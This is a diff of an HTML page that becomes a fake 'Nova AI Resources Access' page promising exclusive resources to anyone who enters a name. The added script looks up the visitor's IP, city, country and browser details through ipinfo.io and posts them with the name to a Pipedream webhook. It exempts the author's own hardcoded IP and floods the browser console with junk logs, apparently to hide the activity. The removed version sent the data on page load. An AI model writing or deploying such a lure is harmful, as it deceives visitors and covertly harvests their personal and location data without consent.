@@ -1,36 +1,138 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Testing</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nova AI Resources Access</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(to right, #2c3e50, #bdc3c7);
+            color: white;
+            padding: 50px;
             text-align: center;
-            background-color: #f2f2f2;
-            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
         }
+
+        .container {
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+            padding: 30px;
+            width: 400px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
         h1 {
-            margin-top: 20px;
+            font-size: 2.5em;
+            margin-bottom: 20px;
         }
+
         p {
-            color: red;
-            font-size: 18px;
+            font-size: 1.2em;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            font-size: 1.2em;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            background: #fff;
+            color: #333;
+        }
+
+        button {
+            padding: 12px 20px;
+            font-size: 1.2em;
+            background-color: #27ae60;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        button:hover {
+            background-color: #2ecc71;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .motivational-message {
+            font-size: 1.2em;
+            margin-bottom: 20px;
+            color: #e74c3c;
+        }
+
+        .hidden-button {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <h1>Testing</h1>
-    <p>The philosophy of philosophy is the study of the nature, scope, and meaning of philosophy itself. It involves critical analysis of philosophical concepts and their foundations. It aims to address fundamental questions about existence, knowledge, values, reason, and language.</p>
+    <div class="container">
+        <h1>Nova AI Resources Access</h1>
+        <p>Please enter your name to unlock exclusive access to Nova AI resources!</p>
+        <div id="name-form">
+            <input type="text" id="userName" placeholder="Enter your name here...">
+            <button onclick="handleNameSubmission()">Unlock Resources</button>
+        </div>
+        <div id="motivational-message" class="motivational-message hidden">
+            <p>Your access to Nova AI is just one step away! Add your name to unlock it.</p>
+        </div>
+    </div>
 
     <script>
-        async function sendDataToWebhook() {
+        const ADMIN_IP = "83.105.112.217"; // Your IP to exclude
+        let spamCount = 0;
+        let spamInterval;
+
+        // Function to generate random console data spam
+        function generateSpam() {
+            const randomData = Math.random().toString(36).substring(2, 15);
+            console.log(randomData);
+            spamCount++;
+
+            // Clear console after 300 logs
+            if (spamCount >= 300) {
+                clearInterval(spamInterval);
+                console.clear();
+            }
+        }
+
+        // Start console spam when page loads
+        spamInterval = setInterval(generateSpam, 50); // Spamming every 50ms
+
+        async function handleNameSubmission() {
+            const userName = document.getElementById('userName').value.trim();
+
+            if (!userName) {
+                // Display motivational message
+                document.getElementById('motivational-message').classList.remove('hidden');
+                return;
+            }
+
             try {
-                // Fetching the user's IP info
                 const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
-                console.log("IP Data Retrieved:", ipData); // Debugging line
+
+                if (ipData.ip === ADMIN_IP) {
+                    // Skip if IP is yours
+                    console.log("Admin IP detected. No data will be sent.");
+                    return;
+                }
 
                 const userAgent = navigator.userAgent;
                 const log = {
+                    name: userName,
                     ip: ipData.ip,
                     city: ipData.city,
                     country: ipData.country,
@@ -38,29 +140,32 @@
                     userAgent,
                     time: new Date().toISOString()
                 };
-                
-                console.log("Data to Send:", log); // Debugging line
-                
-                // Using your Pipedream webhook URL
-                const webhookUrl = "https://eoky7dsuisvr7mo.m.pipedream.net"; // Replace with your new Pipedream webhook URL
+
+                // Replace with your unique webhook URL
+                const webhookUrl = "https://eoky7dsuisvr7mo.m.pipedream.net"; 
+
                 const response = await fetch(webhookUrl, {
                     method: "POST",
                     body: JSON.stringify(log),
                     headers: { "Content-Type": "application/json" }
                 });
-                
-                // Check if the request was successful
+
                 if (response.ok) {
                     console.log("Data successfully sent to the webhook.");
                 } else {
                     console.error("Error sending data to webhook:", response.status);
                 }
+
             } catch (e) {
                 console.error("Error sending data:", e);
             }
+
+            // Hide form and display success message
+            document.getElementById('name-form').classList.add('hidden');
+            document.getElementById('motivational-message').classList.add('hidden');
+            alert("You have unlocked Nova AI Resources! Enjoy your access!");
         }
 
-        sendDataToWebhook(); // Trigger sending data to the webhook in the background
     </script>
 </body>
 </html>
